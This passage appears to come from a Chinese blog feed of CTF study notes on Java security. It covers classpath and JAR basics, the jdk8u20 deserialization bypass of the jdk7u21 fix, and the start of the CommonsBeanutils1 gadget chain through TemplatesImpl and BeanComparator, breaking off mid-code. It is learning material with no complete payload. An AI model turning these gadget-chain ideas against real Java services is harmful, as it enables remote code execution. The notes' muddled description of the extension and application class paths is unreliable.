        <content type="html"><![CDATA[<h2 id="classpath"><a href="#classpath" class="headerlink" title="classpath"></a>classpath</h2><ol><li><strong>classpath</strong>是Java编译器和Java虚拟机(JVM)用来查找类文件的路径</li><li><strong>classpath的类型</strong><ol><li><strong>系统类路径</strong>：由系统类加载器加载，包含JDK的核心类库和扩展类库<ol><li>加载器：由 Bootstrap ClassLoader 加载</li><li>包含 JDK 的核心类库（如 rt.jar、charsets.jar 等），这些类库是 Java 运行时环境（JRE）的核心部分</li><li>通常是 JRE_HOME&#x2F;lib 目录下的 JAR 文件</li><li>含义<ol><li>这些类是 Java 运行的基础，由 JVM 直接加载</li><li>系统类路径优先于其他类路径加载。</li></ol></li></ol></li><li><strong>应用类路径</strong>：由应用类加载器加载，包含应用程序的类文件<ol><li>加载器：由 Extension ClassLoader 加载</li><li>内容：包含 JDK 的扩展类库（如 ext 目录下的 JAR 文件）</li><li>路径：通常是 JRE_HOME&#x2F;lib&#x2F;ext 目录</li><li>含义<ol><li>用于加载 JDK 的扩展类库</li><li>开发者可以将自定义的 JAR 文件放入 ext 目录，这些类会被自动加载</li><li>扩展类路径的优先级低于系统类路径，但高于应用类路径</li></ol></li></ol></li><li><strong>扩展类路径</strong>：由扩展类加载器加载，包含JDK的扩展类库<ol><li>加载器：由 Application ClassLoader（也称为系统类加载器）加载</li><li>内容：包含应用程序的类文件、第三方库（JAR 文件）以及资源文件</li><li>路径：由开发者通过 -classpath 或 -cp 参数显式指定，或者通过环境变量 CLASSPATH 设置</li><li>含义<ol><li>应用类路径的优先级最低，只有在系统类路径和扩展类路径中找不到类时，才会从应用类路径加载</li></ol></li></ol></li></ol></li><li>类加载器的层次结构: Java 的类加载器采用双亲委派模型（Parent Delegation Model）<ol><li>即类加载器在加载类时，会先委托其父类加载器尝试加载，只有在父类加载器无法加载时，才会自己尝试加载。类加载器的层次结构如下：<ol><li>Bootstrap ClassLoader：加载系统类路径中的类</li><li>Extension ClassLoader：加载扩展类路径中的类</li><li>Application ClassLoader：加载应用类路径中的类</li></ol></li></ol></li><li><strong>依赖的存储路径</strong><ol><li>Maven项目<ol><li>默认路径：~&#x2F;.m2&#x2F;repository&#x2F;</li><li>在 Windows 系统中，路径通常是：C:\Users&lt;用户名&gt;.m2\repository\</li><li>在 Linux&#x2F;Mac 系统中，路径通常是：&#x2F;home&#x2F;&lt;用户名&gt;&#x2F;.m2&#x2F;repository&#x2F;</li></ol></li><li>手动管理：依赖通常放在项目的 lib 目录中</li></ol></li></ol><h2 id="maven"><a href="#maven" class="headerlink" title="maven"></a>maven</h2><ol><li>直接跳转<a href="/_posts/JavaWeb4_Maven.md">JavaWeb4_Maven</a></li></ol><h2 id="jar"><a href="#jar" class="headerlink" title="jar"></a>jar</h2><h3 id="jar介绍"><a href="#jar介绍" class="headerlink" title="jar介绍"></a>jar介绍</h3><ol><li><p>总结: 一个打包.class与资源文件的zip格式压缩包，可用于作为库分发和应用部署</p></li><li><p><strong>定义</strong>: JAR（Java Archive）包是一种用于打包Java类文件、资源文件和元数据的压缩文件格式，通常以.jar为扩展名。它基于ZIP格式，允许将多个文件合并为一个文件，便于分发和部署</p></li><li><p><strong>用途</strong></p><ol><li>库分发：将Java库打包为JAR文件，供其他项目使用</li><li>应用部署：将应用程序及其依赖打包为JAR文件，便于部署</li><li>资源打包：将图片、配置文件等资源与代码一起打包</li></ol></li><li><p><strong>结构</strong></p><ol><li><p>元数据目录: META-INF（必须），用于存储元数据</p><ol><li>最重要的文件是 MANIFEST.MF，它包含JAR包的元信息<ol><li>主类（Main-Class）：指定可执行JAR包的入口类</li><li>版本信息：JAR包的版本号</li><li>类路径（Class-Path）：指定依赖的其他JAR包</li></ol></li></ol></li><li><p>依赖库（可选）</p></li><li><p>其他文件（可选）</p><ol><li>META-INF&#x2F;*.SF：签名文件</li><li>META-INF&#x2F;*.DSA 或 META-INF&#x2F;*.RSA：签名块文件</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// MANIFEST.MF</span></span><br><span class="line">Manifest-Version: <span class="number">1.0</span></span><br><span class="line">Main-Class: com.example.Main</span><br><span class="line">Class-Path: lib/dependency1.jar lib/dependency2.jar</span><br></pre></td></tr></table></figure></li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">myapp.jar</span><br><span class="line">│</span><br><span class="line">├── com/ <span class="comment">// 编译后的Java类文件（.class文件）</span></span><br><span class="line">│   └── example/</span><br><span class="line">│       ├── MyClass.class</span><br><span class="line">│       └── Utils.class</span><br><span class="line">│</span><br><span class="line">├── config/ <span class="comment">// 资源文件: 配置文件</span></span><br><span class="line">│   └── settings.properties</span><br><span class="line">│</span><br><span class="line">├── images/ <span class="comment">// 资源文件: 图片文件</span></span><br><span class="line">│   └── logo.png</span><br><span class="line">│</span><br><span class="line">└── META-INF/  <span class="comment">// 元数据文件（META-INF 目录）</span></span><br><span class="line">    ├── MANIFEST.MF</span><br><span class="line">    └── EXAMPLE.SF</span><br></pre></td></tr></table></figure></li></ol><h3 id="idea查看jar"><a href="#idea查看jar" class="headerlink" title="idea查看jar"></a>idea查看jar</h3><ul><li>ref<ul><li>[<a href="https://blog.csdn.net/weixin_44009447/article/details/107553098]">https://blog.csdn.net/weixin_44009447/article/details/107553098]</a></li></ul></li></ul><ol><li>S1: 新建一个文件夹，将jar包放入其中</li><li>S2: 将该文件夹打开为项目，右键jar包<code>add as library</code>，即可查看idea反编译源码</li><li>局限: jar包中含有的是经过编译后生成的class文件，和原java文件会有不同，而且完全不会存在注释信息，并且有些命名会被混淆</li></ol><h2 id="war"><a href="#war" class="headerlink" title="war"></a>war</h2><h2 id="src-zip"><a href="#src-zip" class="headerlink" title="src.zip"></a>src.zip</h2><h2 id="IDEA操作"><a href="#IDEA操作" class="headerlink" title="IDEA操作"></a>IDEA操作</h2><h3 id="IDEA搜索功能"><a href="#IDEA搜索功能" class="headerlink" title="IDEA搜索功能"></a>IDEA搜索功能</h3><h4 id="extends-implements和分析类"><a href="#extends-implements和分析类" class="headerlink" title="extends, implements和分析类"></a>extends, implements和分析类</h4><ul><li>常用<ul><li>ctrl+h</li><li>alt+7</li></ul></li></ul><ol><li>查看实现类<ol><li><code>ctrl+h</code>有树状结构<ol><li><img src="/pic/Java%E5%AE%89%E5%85%A80_%E8%B0%83%E8%AF%95%E4%B8%8E%E5%88%86%E6%9E%90/ctrl_h.png" alt="pic"></li></ol></li><li><code>ctrl+alt+b</code>没有树状结构<ol><li><img src="/pic/Java%E5%AE%89%E5%85%A80_%E8%B0%83%E8%AF%95%E4%B8%8E%E5%88%86%E6%9E%90/ctrl_alt_b.png" alt="pic"></li></ol></li><li>diagram法，右键可选</li></ol></li><li><code>ctrl+fn+f12</code>，可以看到类的方法和成员和内部类，并支持搜索快速定位<ol><li><img src="/pic/Java%E5%AE%89%E5%85%A80_%E8%B0%83%E8%AF%95%E4%B8%8E%E5%88%86%E6%9E%90/ctrl_f12.png" alt="pic"></li></ol></li><li><code>alt+7</code>，当前类的struct，包括成员属性，可以选择查看继承关系的方法<ol><li><img src="/pic/Java%E5%AE%89%E5%85%A80_%E8%B0%83%E8%AF%95%E4%B8%8E%E5%88%86%E6%9E%90/alt_7.png" alt="pic"></li></ol></li></ol><h4 id="搜索与查找"><a href="#搜索与查找" class="headerlink" title="搜索与查找"></a>搜索与查找</h4><ol><li><code>shift+shift</code>在整个项目中搜索匹配符合关键词的位置</li><li><code>ctrl+shift+f</code>项目中搜索关键字</li><li><code>ctrl+e</code>，可以查找最近修改的文件，支持模糊匹配</li><li><code>gd</code>，在方法处可以<strong>跳转到定义处</strong>或者<strong>查看全局调用处</strong></li></ol><h3 id="idea与命令行协调"><a href="#idea与命令行协调" class="headerlink" title="idea与命令行协调"></a>idea与命令行协调</h3>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java安全5(12)_jdk8u20</title>
      <link href="/2024/11/22/Java%E5%AE%89%E5%85%A85(12)_jdk8u20/"/>
      <url>/2024/11/22/Java%E5%AE%89%E5%85%A85(12)_jdk8u20/</url>
      
        <content type="html"><![CDATA[<blockquote><p>吐然发现期末了课内都还没学得来速通，学了一下午和一上午电工(不是走软件要学什么电工，真是折磨，还是回归java链好玩<br>很不好玩，瞄了一眼，jdk8u20比较底层有点难度，后面再来补，先跑去shiro</p></blockquote><h2 id="jdk7u21还在发力"><a href="#jdk7u21还在发力" class="headerlink" title="jdk7u21还在发力"></a>jdk7u21还在发力</h2><blockquote><p>其实jdk8u20只是jdk7u21的绕过版本</p></blockquote><ol><li><p>在jdk7u21篇最后有讲到是它的修改导致了后续有jdk8u20，也就是jdk7u21的修改没有去除风险，<a href="https://github.com/openjdk/jdk7u/commit/b3dd6104b67d2a03b94a4a061f7a473bb0d2dc4e">修复源码变动</a>，这里的处理方式是在getInstance()抛出异常而我们在这里的type并不是Anntation</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">      annotationType = AnnotationType.getInstance(type);</span><br><span class="line">  &#125; <span class="keyword">catch</span>(IllegalArgumentException e) &#123;</span><br><span class="line">      <span class="comment">// ---</span></span><br><span class="line">      <span class="comment">// Class is no longer an annotation type; all bets are off</span></span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">      <span class="comment">// +++</span></span><br><span class="line">      <span class="comment">// Class is no longer an annotation type; time to punch out</span></span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.InvalidObjectException(<span class="string">&quot;Non-annotation type in annotation serial stream&quot;</span>);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></li><li><p>再看到修复后第一次的AnnotationInvocationHandler的readObject方法</p><ol><li>该类内部的readObject方法第一行就调用了defaultReadObject()方法，该方法主要用来从字节流中读取对象的字段值，它可以从字节流中按照定义对象的类描述符以及定义的顺序读取字段的名称和类型信息</li><li>我们可以看到: <strong>传入的AnnotationInvocationHandler对象在异常被抛出前，已经从序列化数据中被还原出来</strong>。换句话说就是我们把恶意的种子种到了运行对象中，但是因为出现异常导致该种子没法生长</li><li><strong>应对思路</strong>: 绕过异常处理</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span> <span class="keyword">throws</span> java.io.IOException, ClassNotFoundException &#123;</span><br><span class="line">     s.defaultReadObject();</span><br><span class="line">     <span class="comment">// Check to make sure that types have not evolved incompatibly</span></span><br><span class="line">     <span class="type">AnnotationType</span> <span class="variable">annotationType</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">     <span class="keyword">try</span> &#123;</span><br><span class="line">         annotationType = AnnotationType.getInstance(type);</span><br><span class="line">     &#125; <span class="keyword">catch</span>(IllegalArgumentException e) &#123;</span><br><span class="line">         <span class="comment">// Class is no longer an annotation type; time to punch out</span></span><br><span class="line">         <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.InvalidObjectException(<span class="string">&quot;Non-annotation type in annotation serial stream&quot;</span>);</span><br><span class="line">     &#125;</span><br><span class="line">     Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes();</span><br><span class="line">     <span class="comment">// If there are annotation members without values, that</span></span><br><span class="line">     <span class="comment">// situation is handled by the invoke method.</span></span><br><span class="line">     <span class="keyword">for</span> (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) &#123;</span><br><span class="line">         <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> memberValue.getKey();</span><br><span class="line">         Class&lt;?&gt; memberType = memberTypes.get(name);</span><br><span class="line">         <span class="keyword">if</span> (memberType != <span class="literal">null</span>) &#123;  <span class="comment">// i.e. member still exists</span></span><br><span class="line">             <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> memberValue.getValue();</span><br><span class="line">             <span class="keyword">if</span> (!(memberType.isInstance(value) ||</span><br><span class="line">                   value <span class="keyword">instanceof</span> ExceptionProxy)) &#123;</span><br><span class="line">                 memberValue.setValue(</span><br><span class="line">                     <span class="keyword">new</span> <span class="title class_">AnnotationTypeMismatchExceptionProxy</span>(</span><br><span class="line">                         value.getClass() + <span class="string">&quot;[&quot;</span> + value + <span class="string">&quot;]&quot;</span>).setMember(</span><br><span class="line">                             annotationType.members().get(name)));</span><br><span class="line">             &#125;</span><br><span class="line">         &#125;</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure></li></ol><h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><h3 id="try-catch"><a href="#try-catch" class="headerlink" title="try-catch"></a>try-catch</h3><blockquote><p>前文说到：我们现在要绕过异常，那肯定先熟悉一下异常</p></blockquote><ol><li>这里主要考虑嵌套包裹的情形，差不多有两种，这里直接上结论<ol><li><strong>有异常抛出调用无异常抛出: 外部不会被中断</strong><ol><li>在一个存在try … catch块的方法（有异常抛出）中去调用另一个存在try … catch块的方法（无异常抛出），如果被调用的方法（无异常抛出）出错，那么会继续执行完调用方法的代码逻辑，但是若调用方法也出错，那么会终止代码运行的进程</li></ol></li><li>无异常抛出调用有异常抛出: 外部会被中断<ol><li>在一个存在try … catch块的方法（无异常抛出）中去调用另一个存在try … catch块的方法（有异常抛出），如果被调用的方法（有异常抛出）出错，那么会导致调用方法出错且不会继续执行完调用方法的代码逻辑，但是不会终止代码运行的进程</li></ol></li></ol></li></ol><h3 id="Java对象序列化流协议"><a href="#Java对象序列化流协议" class="headerlink" title="Java对象序列化流协议"></a>Java对象序列化流协议</h3><h4 id="序列化中的两个宏观机制"><a href="#序列化中的两个宏观机制" class="headerlink" title="序列化中的两个宏观机制"></a>序列化中的两个宏观机制</h4><ol><li><em><strong>引用机制</strong></em><ol><li>在序列化流程中，对象所属类、对象成员属性等数据都会被使用固定的语法写入到序列化数据，并且会被特定的方法读取；在序列化数据中，存在的对象有null、new objects、classes、arrays、strings、back references等，这些对象在序列化结构中都有对应的描述信息，并且<strong>每一个写入字节流的对象都会被赋予引用Handle，并且这个引用Handle可以反向引用该对象（使用TC_REFERENCE结构，引用前面handle的值）</strong>，引用Handle会从0x7E0000开始进行顺序赋值并且自动自增，一旦字节流发生了重置则该引用Handle会重新从0x7E0000开始</li></ol></li><li><em><strong>成员抛弃</strong></em><ol><li>在反序列化中，如果当前这个对象中的某个字段并没有在字节流中出现，则这些字段会使用类中定义的默认值，如果这个值出现在字节流中，但是并<strong>不属于对象，则抛弃该值</strong>，但是如果这个值是一个对象的话，那么会为这个值分配一个 Handle</li></ol></li></ol><h4 id="操作工具：SerializationDumper"><a href="#操作工具：SerializationDumper" class="headerlink" title="操作工具：SerializationDumper"></a>操作工具：SerializationDumper</h4><blockquote><p>当前为SerializationDumper-v1.14.jar</p></blockquote><ol><li><p><strong>一：从hex&#x2F;raw.bin输入查看对象流</strong></p><ol><li>-f</li><li>-r</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1. 字面量中的十六进制asynchronous编码</span></span><br><span class="line">java -jar [jarb包] aced0005740004414243447071007e0000</span><br><span class="line">   <span class="comment">// 输出</span></span><br><span class="line">   STREAM_MAGIC - <span class="number">0xac</span> ed</span><br><span class="line">   STREAM_VERSION - <span class="number">0x00</span> <span class="number">05</span></span><br><span class="line">   Contents</span><br><span class="line">     TC_STRING - <span class="number">0x74</span></span><br><span class="line">       newHandle <span class="number">0x00</span> 7e <span class="number">00</span> <span class="number">00</span></span><br><span class="line">       Length - <span class="number">4</span> - <span class="number">0x00</span> <span class="number">04</span></span><br><span class="line">       Value - ABCD - <span class="number">0x41424344</span></span><br><span class="line">     TC_NULL - <span class="number">0x70</span></span><br><span class="line">     TC_REFERENCE - <span class="number">0x71</span></span><br><span class="line">       Handle - <span class="number">8257536</span> - <span class="number">0x00</span> 7e <span class="number">00</span> <span class="number">00</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. 文本文件中的十六进制asynchronous编码</span></span><br><span class="line">java -jar [jarb包] -f hex-ascii-input-file.txt</span><br><span class="line"></span><br><span class="line"><span class="comment">// 3. 含原始序列化数据的文件</span></span><br><span class="line">java -jar SerializationDumper-v1<span class="number">.14</span>.jar -r raw-input-file.bin</span><br></pre></td></tr></table></figure></li><li><p><em><strong>二：重建序列化流</strong></em></p><ol><li>将转储的序列化流转换回原始字节流</li><li><strong>一般工作流如下</strong><ol><li>注意事项<ol><li>流重建模式当前仅对转储数据中的十六进制编码字节进行操作。因此，将字符串“ABCD”更改为“AAAABBBB”不会在输出文件中产生字节0x 4141414142424242的预期效果</li><li>长度字段在流重建期间不会自动更新。这可能是可取的或不可取的，但如果你修改一个字符串值的方式，改变长度只是要注意，你可能还需要相应地修改长度（十六进制）字段。这同样适用于数组</li><li><strong>引用句柄&#x2F;ID是递增的</strong>，从0x 7 e0000开始，因此第一个newHandle字段由0x 7 e0000引用，第二个由0x 7 e0001引用，如果流包含任何TC_REFERENCE元素，并且您修改它以删除包含newHandle字段的元素，那么您可能会中断流中的引用，除非您手动更新它们</li></ol></li><li>-b</li></ol></li></ol> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1. 获取序列化流</span></span><br><span class="line">java -jar %SDumper% aced0005740004414243447071007e0000</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. 获取内容存入文件temp.txt</span></span><br><span class="line">STREAM_MAGIC - <span class="number">0xac</span> ed</span><br><span class="line">STREAM_VERSION - <span class="number">0x00</span> <span class="number">05</span></span><br><span class="line">Contents</span><br><span class="line">  TC_STRING - <span class="number">0x74</span></span><br><span class="line">    newHandle <span class="number">0x00</span> 7e <span class="number">00</span> <span class="number">00</span></span><br><span class="line">    <span class="comment">// Length - 4 - 0x00 04</span></span><br><span class="line">    <span class="comment">// Value - ABCD - 0x41424344  // 将字符串值从ABCD修改为AAAABBBB，</span></span><br><span class="line">    Length - <span class="number">8</span> - <span class="number">0x00</span> 08</span><br><span class="line">    Value - AAAABBBB - <span class="number">0x4141414142424242</span></span><br><span class="line">  TC_NULL - <span class="number">0x70</span></span><br><span class="line">  TC_REFERENCE - <span class="number">0x71</span></span><br><span class="line">    Handle - <span class="number">8257536</span> - <span class="number">0x00</span> 7e <span class="number">00</span> <span class="number">00</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 3. 重建流并输入到rebuilt.bin</span></span><br><span class="line">java -jar %SDumper% -b dumped.txt rebuilt.bin</span><br></pre></td></tr></table></figure></li><li><p><a href="https://github.com/NickstaDB/SerializationDumper?tab=readme-ov-file#limitations">局限</a></p><ol><li>情况一：如果流包含使用序列化协议版本1编写的externalContents元素，则无法在不使用原始类的情况下将其序列</li></ol></li></ol><h3 id="对象序列化流基础Grammar"><a href="#对象序列化流基础Grammar" class="headerlink" title="对象序列化流基础Grammar"></a>对象序列化流基础Grammar</h3><ol><li><p>贴上官方文档的说明，然后逐个击破，一些先进行省略</p></li><li><p>stream就是指完整的序列化协议流，它是有三部分组成：magic、version和contents。有两个流常数需要进行注意</p> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 流常数</span></span><br><span class="line"><span class="keyword">final</span> <span class="keyword">static</span> <span class="type">short</span> <span class="variable">STREAM_MAGIC</span> <span class="operator">=</span> (<span class="type">short</span>)<span class="number">0xaced</span>;</span><br><span class="line"><span class="keyword">final</span> <span class="keyword">static</span> <span class="type">short</span> <span class="variable">STREAM_VERSION</span> <span class="operator">=</span> <span class="number">5</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 语法</span></span><br><span class="line">stream:</span><br><span class="line">  magic version contents</span><br><span class="line"></span><br><span class="line">contents:</span><br><span class="line">  content</span><br><span class="line">  contents content</span><br><span class="line"></span><br><span class="line">content:</span><br><span class="line">  object</span><br><span class="line">  blockdata</span><br><span class="line"></span><br><span class="line">object:</span><br><span class="line">  newObject</span><br><span class="line">  newClass</span><br><span class="line">  newArray</span><br><span class="line">  newString</span><br><span class="line">  newEnum</span><br><span class="line">  newClassDesc</span><br><span class="line">  prevObject</span><br><span class="line">  nullReference</span><br><span class="line">  exception</span><br><span class="line">  TC_RESET</span><br></pre></td></tr></table></figure></li></ol><h3 id="稍加注意的语法规则"><a href="#稍加注意的语法规则" class="headerlink" title="稍加注意的语法规则"></a>稍加注意的语法规则</h3><h3 id="Nop"><a href="#Nop" class="headerlink" title="Nop"></a>Nop</h3><ol start="3"><li>不同flag之间的关系</li><li>套了两层readObject，两次包裹</li></ol><h2 id="Ref"><a href="#Ref" class="headerlink" title="Ref"></a>Ref</h2><ol><li><a href="https://docs.oracle.com/javase/8/docs/platform/serialization/spec/protocol.html">对象流协议官方版</a></li><li><a href="https://xz.aliyun.com/t/9765?time__1311=n4+xnD0DuDRDB0DyAD9DBqOoTKAKmqitKeWI84D">信息量很多</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java安全 </tag>
            
            <tag> java反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java安全5(11)_CommonsBeanutils1</title>
      <link href="/2024/11/22/Java%E5%AE%89%E5%85%A85(11)_CommonsBeanutils1/"/>
      <url>/2024/11/22/Java%E5%AE%89%E5%85%A85(11)_CommonsBeanutils1/</url>
      
        <content type="html"><![CDATA[<h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><ol><li>可恶啊大家都没有写，只好自己找了，用的最新版<ol><li>pom.xml没有下载是会说找不到，先maven install后再说</li><li>记得设置maven下载源码: <a href="https://blog.csdn.net/qq_41937438/article/details/102633266">下载依赖的源码</a></li><li>IDEA的全局查找的是源码的，没有源码只有class时是找不到的，可以到External Libraries这里看是否已经下载了class文件</li></ol></li></ol><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- https://mvnrepository.com/artifact/commons-beanutils/commons-beanutils --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-beanutils<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-beanutils<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.9.4<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="commons-beanutils"><a href="#commons-beanutils" class="headerlink" title="commons-beanutils"></a>commons-beanutils</h2><blockquote><p>commons-beanutils中诸如此类的辅助方法有很多，如调用setter、拷贝属性等</p></blockquote><ol><li>Apache Commons Beanutil 是 Apache Commons 工具集下的另一个项目，它提供了对普通Java类对象（也称为JavaBean）的一些操作方法</li><li><em><strong>什么是JavaBean from wiki百科</strong></em>: 一个数据结构的封装<ol><li>有一个public的无参数构造函数</li><li>属性可以透过get、set、is（可替代get，用在布尔型属性上）方法或遵循特定命名规则的其他方法访问。</li><li>可序列化。</li></ol></li><li>commons-beanutils中提供了一个静态方法 PropertyUtils.getProperty ，让使用者可以直接调用任<br>意JavaBean的getter方法: <code>PropertyUtils.getProperty(new Cat(), &quot;name&quot;);</code>会自动找到name属性的getter方法，也就是 getName，而且可以<strong>调用函数</strong></li><li><strong>支持递归</strong>: 可以通过 <code>PropertyUtils.getProperty(a, &quot;b.c&quot;);</code> 的方式进行递归获取。通过这个方法，使用者可以很方便地调用任意对象的getter，适用于在不确定JavaBean是哪个类对象时使用</li></ol><h2 id="TemplatesImpl-getOutputProperties"><a href="#TemplatesImpl-getOutputProperties" class="headerlink" title="TemplatesImpl.getOutputProperties()"></a>TemplatesImpl.getOutputProperties()</h2><ol><li><p>之前学TemplatesImpl时就有注意到这一个属性，注意到，其中调用了TempalatesImpl链子的入口，</p> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">synchronized</span> Properties <span class="title function_">getOutputProperties</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> newTransformer().getOutputProperties();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (TransformerConfigurationException e) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ol><h2 id="BeanComparator"><a href="#BeanComparator" class="headerlink" title="BeanComparator"></a>BeanComparator</h2><ol><li><p>顺着思路，寻找一个调用<code>PropertyUtils.getProperty()</code>的方法</p></li><li><p>发现BeanCompareator中的compare()方法有进行调用，只要能在这里触发链子就好了！思路就见下面了</p> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">compare</span><span class="params">( <span class="keyword">final</span> T o1, <span class="keyword">final</span> T o2 )</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( property == <span class="literal">null</span> ) &#123;</span><br><span class="line">        <span class="comment">// compare the actual objects</span></span><br><span class="line">        <span class="keyword">return</span> internalCompare( o1, o2 );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">Object</span> <span class="variable">value1</span> <span class="operator">=</span> PropertyUtils.getProperty( o1, property );</span><br><span class="line">        <span class="keyword">final</span> <span class="type">Object</span> <span class="variable">value2</span> <span 